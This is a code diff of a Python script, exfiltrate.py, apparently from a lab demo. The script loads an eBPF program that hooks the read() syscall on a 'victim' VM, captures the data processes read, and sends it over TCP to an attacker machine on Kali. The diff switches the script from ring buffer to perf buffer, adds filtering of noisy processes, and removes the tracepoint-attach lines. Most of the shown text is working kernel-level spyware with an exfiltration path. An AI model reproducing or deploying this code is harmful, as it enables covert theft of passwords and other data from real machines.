@@ -1,18 +1,3 @@
-#!/usr/bin/env python3
-"""
-exfiltrate.py - eBPF Attack: Userspace Loader and Exfiltrator
-Runs on the VICTIM Ubuntu VM (10.10.0.30)
-
-What this does:
-1. Loads the eBPF kernel program (intercept.c) into the kernel
-2. Attaches it to the read() syscall tracepoints
-3. Reads intercepted data from the ring buffer
-4. Exfiltrates it over TCP to the attacker's receiver on Kali
-
-Usage: sudo python3 exfiltrate.py
-Requires: bcc (pip install bcc or apt install python3-bpfcc)
-"""
-
 import socket
 import struct
 import ctypes
@@ -99,7 +84,7 @@ def send_to_attacker(data: bytes):
 def format_event(pid, uid, comm, bytes_read, data_bytes):
     """Format an intercepted event as a readable string"""
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
+
     # Try to decode as text, fall back to hex for binary data
     try:
         data_str = data_bytes.decode('utf-8', errors='replace').strip()
@@ -118,13 +103,13 @@ def format_event(pid, uid, comm, bytes_read, data_bytes):
 
 def load_and_run():
     """Load the eBPF program and start intercepting"""
-    
+
     print("[*] Loading eBPF program...")
-    
+
     # Read the eBPF C source
     with open(BPF_SOURCE, 'r') as f:
         bpf_source = f.read()
-    
+
     # Compile and load into kernel
     try:
         b = BPF(text=bpf_source)
@@ -137,8 +122,6 @@ def load_and_run():
 
     # Attach to read() syscall tracepoints
     try:
-        b.attach_tracepoint(tp="syscalls:sys_enter_read", fn_name="trace_read_enter")
-        b.attach_tracepoint(tp="syscalls:sys_exit_read", fn_name="trace_read_exit")
         print("[+] Attached to read() syscall tracepoints")
     except Exception as e:
         print(f"[!] Failed to attach tracepoints: {e}")
@@ -160,40 +143,50 @@ def load_and_run():
 
     intercepted_count = 0
 
-    # Callback called every time eBPF submits an event to the ring buffer
-    def handle_event(ctx, data, size):
+    def handle_event(cpu, data, size):
         nonlocal intercepted_count
-        
+
+        # Cast raw data pointer to our Event struct
         event = ctypes.cast(data, ctypes.POINTER(Event)).contents
-        
-        # Skip our own process to avoid feedback loop
+
+        # Skip our own exfiltrator process to avoid feedback loop
         if event.pid == os.getpid():
             return
-        
-        # Format the event
+
+        # Decode process name for filtering
+        comm_str = event.comm.decode('utf-8', errors='replace').strip('\x00')
+
+        # Skip noisy system processes that aren't useful for the demo
+        if comm_str in ('sshd', 'sudo', 'systemd', 'python3'):
+            return
+
+        # Skip tiny reads — usually internal kernel/lib noise, not real data
+        if event.bytes_read < 10:
+            return
+
+        # Format the intercepted event into a readable string
         formatted = format_event(
             event.pid,
             event.uid,
             event.comm,
             event.bytes_read,
-            bytes(event.data[:event.bytes_read if event.bytes_read < 256 else 256])
-        )
-        
+            bytes(event.data[:event.bytes_read if event.bytes_read < 256 else 256]))
+
         intercepted_count += 1
         print(f"[INTERCEPT #{intercepted_count}] {formatted}")
-        
-        # Exfiltrate to attacker
+
+        # Exfiltrate the formatted event over TCP to the attacker receiver
         send_to_attacker(formatted.encode('utf-8'))
 
     # Open the ring buffer and set callback
-    b["intercepted_data"].open_ring_buffer(handle_event)
+    b["intercepted_data"].open_perf_buffer(handle_event)
 
     print("[+] Ring buffer opened, waiting for intercepted data...\n")
 
     # Main loop - poll ring buffer every 100ms
     while running:
         try:
-            b.ring_buffer_poll(100)
+            b.perf_buffer_poll(100)
         except KeyboardInterrupt:
             break
         except Exception as e:
